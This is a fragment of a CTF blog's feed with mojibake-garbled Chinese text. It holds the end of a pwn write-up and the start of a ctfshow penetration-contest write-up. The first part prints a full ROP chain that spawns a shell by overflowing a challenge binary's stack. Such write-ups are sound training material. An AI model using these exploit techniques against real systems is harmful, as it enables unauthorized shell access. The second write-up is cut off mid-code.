src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110114648914.png" alt="image-20250110114648914"></p><p>v1æ¥æ”¶è¾“å…¥ï¼Œé‚£ä¹ˆè¿™é‡Œv3å­˜åœ¨æ ˆæº¢å‡ºï¼Œåç§»0x70+0x8</p><p>sub_40117D æ˜¯base64è§£ç </p><p>äºæ˜¯ç”¨ ROPgadget ç”Ÿæˆpayloadæ‰“æ ˆæº¢å‡ºï¼ŒåŠ ä¸Šåç§»é‡åbase64ç¼–ç payload</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span> pwn <span class="token parameter variable">--ropchain</span> <span class="token operator">></span> exp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€ç»ˆpayloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token comment"># Padding goes here</span>p <span class="token operator">=</span> <span class="token string">b''</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004005af</span><span class="token punctuation">)</span> <span class="token comment"># pop rax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000480bb1</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004458a0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000480bb1</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004006a6</span><span class="token punctuation">)</span> <span class="token comment"># pop rdi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044cb86</span><span class="token punctuation">)</span> <span class="token comment"># pop rdx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004458a0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401dac</span><span class="token punctuation">)</span> <span class="token comment"># syscall</span><span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰‹åŠ¨ç©è´ªåƒè›‡åˆ°2åˆ†åï¼Œqé€€å‡ºè·³è½¬åˆ°åé—¨å‡½æ•°ï¼Œæ‰“å…¥payloadå³å¯</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110115102546.png" alt="image-20250110115102546"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;Go to æµ·å—ï¼Œåœ¨è¿™ä¸ªå¯’å†·çš„å†¬å¤©ç©¿ä¸Šä¸€ä»¶çŸ­è¢–&lt;/p&gt;</summary>
    
    
    
    <category term="çº¿ä¸‹èµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshowå…ƒæ—¦æ¸—é€èµ›</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/</id>
    <published>2024-12-31T11:58:52.000Z</published>
    <updated>2025-01-13T16:36:12.392Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é©¬ä¸Šå°±è¦æœŸæœ«è€ƒä½†è¿˜æ˜¯æ¥æ‰“äº†ï¼Œç»™3-1å›°äº†å¥½å‡ å¤©ï¼Œè¿˜å¥½æœ€åæ²¡æŒ‚ç§‘ï¼ˆ</p><p>å®˜æ–¹wpï¼š<a href="https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh">https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh</a></p><span id="more"></span><hr><h1 id="ç¬¬ä¸€ç« "><a href="#ç¬¬ä¸€ç« " class="headerlink" title="ç¬¬ä¸€ç« "></a>ç¬¬ä¸€ç« </h1><h2 id="å¯ç¨‹"><a href="#å¯ç¨‹" class="headerlink" title="å¯ç¨‹"></a>å¯ç¨‹</h2><p><del>å‡ºå¸ˆæœªæ·èº«å…ˆæ­»</del></p><p>hintï¼š</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">6332468885045739207798242375080077355892316665891880211715759509399402551400860520908019724111820758062002779222649162563769520681049420842627327653028697570023368621511584229066629851913921934625112891871237543378546847020163969961987899081707281756262252814062564762160798635747507687871699694751527174309034601497055974635051437994874886300646949625353558253782655181334148321351659981250042829128658958363792059338950291542877888243170008437712513314359394103899575725527464109331033472122605333514068765847981281168351027057708345483333279522044142183133967673483865459337003717067807320811287647328283988796540276949990614458889846521960577177616236664713902265004190473545460095268491900380558170082520224728576953003878275008182317199296267075737759724512554280591198406698260860277025465102137918643581832045307760200048667705365456953303241675697777911751700448120282274949664588640026605985924903540176391580279688363295982824196664632859001756744080268810527371486113951531943901306283561047843588041585812947331967034769134340552094418027084857234553229856544474009457347175105099512591554624971894599838746900995752415971119041937111084886165664866650538846290845643642053197978121486841730575238128406845555442419014173176404421806730649214788953146176851031811997323821914774362578122351737794097455302561907117362800799157551057036577218572856787471028581031618485255309875312810807897548663541884705879790370871272092175498582934779006508008372003215236813420967574992987533634390592255398695736558142823465028853521646032675657687007258165839140903999201766151183184688594176955338531845223421284906472573394877068730983517293944705652691178721839660327167016317868190701523720009185011216522451173878805968328968074937750042295853272548720830984864809212598178047616120161664500748924315852951589930193222279698129328148259041368119935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä»”ç»†çœ‹ä¸€ä¸‹ä¸‰è¡Œåº”è¯¥æ˜¯ä»£è¡¨nï¼Œpï¼Œq</p><p>è¿˜ç»™äº†åŠ å¯†å‹ç¼©åŒ…ï¼Œä¸ä¼šmiscï¼Œå¯ç¨‹å¤±è´¥ï¼ˆ</p><p>å“å§æ§½æ€ä¹ˆæ˜¯çˆ†6ä½æ•°å­—</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20241231203107904.png" alt="image-20241231203107904"></p><p>éš¾ç»·</p><p>flagï¼š<code>ctfshow&#123;654321&#125;</code></p><hr><h2 id="ç ´è§£åŠ å¯†é€šè®¯"><a href="#ç ´è§£åŠ å¯†é€šè®¯" class="headerlink" title="ç ´è§£åŠ å¯†é€šè®¯"></a>ç ´è§£åŠ å¯†é€šè®¯</h2><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20241231203318579.png" alt="image-20241231203318579"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">import</span> secretMessageResponse    <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>        <span class="token keyword">import</span> pip        pip<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'install'</span><span class="token punctuation">,</span> <span class="token string">'secretMessageResponse'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">from</span> secretMessageResponse <span class="token keyword">import</span> printMessage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªæ˜¯æ‰€è°“çš„ç‰¹å·¥ä¿å¯†çš„é€šè®¯æ‰‹æ³•</p><p>pip secretMessageResponse åº“ä¸‹æ¥çœ‹çœ‹æºç </p><p>printMessage.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token punctuation">,</span>datetimemessage <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"inputMessage_20241216"</span> <span class="token punctuation">:</span><span class="token triple-quoted-string string">'''gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM='''</span><span class="token punctuation">,</span>    <span class="token string">"inputMessage_20240411"</span> <span class="token punctuation">:</span> <span class="token triple-quoted-string string">'''Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI='''</span><span class="token punctuation">,</span>    <span class="token string">"inputMessage_20240305"</span> <span class="token punctuation">:</span> <span class="token triple-quoted-string 